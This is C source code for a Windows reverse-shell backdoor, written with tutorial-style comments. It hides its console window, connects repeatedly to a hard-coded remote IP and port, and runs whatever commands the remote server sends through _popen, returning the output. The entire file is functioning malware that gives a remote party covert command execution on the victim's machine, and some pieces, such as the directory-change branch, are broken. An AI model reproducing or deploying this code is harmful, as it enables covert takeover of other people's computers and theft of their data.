#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> //initiate a connection with our server
#include <windows.h> //we will need windows-specific functions
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(paramater, size) (void) memset((paramater), 0, (size))

int sock; //we will need to use the socket object in various functions


void Shell() {
	char buffer[1024]; //holds the commands received from the server
	char container[1024];
	char total_response[18384]; //holds the response of the terminal

	while (1) {
		jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer), 0);

		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		} else if (strncmp("cd ", buffer, 3) == 0) {
			chdir(""); //change the working directory of the target's terminal
		} else {
			FILE *fp;
			fp = _popen(buffer, "r"); //execute the command inside the buffer
			//read from the pipe and store it inside of the container variable
			while(fgets(container, sizeof(container), fp) != NULL) {
				strcat(total_response, container); //response is likely > 1024 bites, read every bit and store it in total_response
			}
			send(sock, total_response, sizeof(total_response), 0); //send the return data to the remote server
			fclose(fp); //close the pipeline
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

	//we want to make our program invisible when it runs
	HWND stealth;
	AllocConsole(); //allocated a new console to the calling process
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0); //speicifies whether we want to show window to the target

	struct sockaddr_in ServAddr;
	unsigned short ServPort; //need the IP and PORT to connect to
	char *ServIP;
	WSADATA wsaData; //structure containing information about windows sockets

	ServIP = "192.168.2.191";
	ServPort = 50005;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

	//define the socket object once we validate the version
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr)); //wipe all the paramaters beloning to ServAddr
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
		Sleep(10);
		goto start;
	}
	Shell(); //received the commands from the server and executes the results
}
